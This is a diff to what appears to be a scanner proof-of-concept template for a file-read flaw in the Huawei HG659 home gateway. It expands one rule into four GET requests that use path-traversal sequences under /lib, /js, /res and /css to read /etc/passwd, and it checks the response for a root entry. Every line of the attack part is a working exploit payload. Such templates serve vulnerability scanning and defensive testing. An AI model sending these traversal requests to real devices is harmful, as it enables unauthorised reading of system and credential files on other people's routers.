@@ -1,9 +1,25 @@
 name: poc-yaml-huawei-home-gateway-hg659-fileread
-rules:
-  - method: GET
-    path: /lib///....//....//....//....//....//....//....//....//etc//passwd
-    expression: |
-      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+groups:
+  poc1:
+    - method: GET
+      path: /lib///....//....//....//....//....//....//....//....//etc//passwd
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  poc2:
+    - method: GET
+      path: /js///....//....//....//....//....//....//....//....//etc//passwd
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  poc3:
+    - method: GET
+      path: /res///....//....//....//....//....//....//....//....//etc//passwd
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+  poc4:
+    - method: GET
+      path: /css///....//....//....//....//....//....//....//....//etc//passwd
+      expression: |
+        response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
 detail:
   author: B1anda0(https://github.com/B1anda0)
   links:
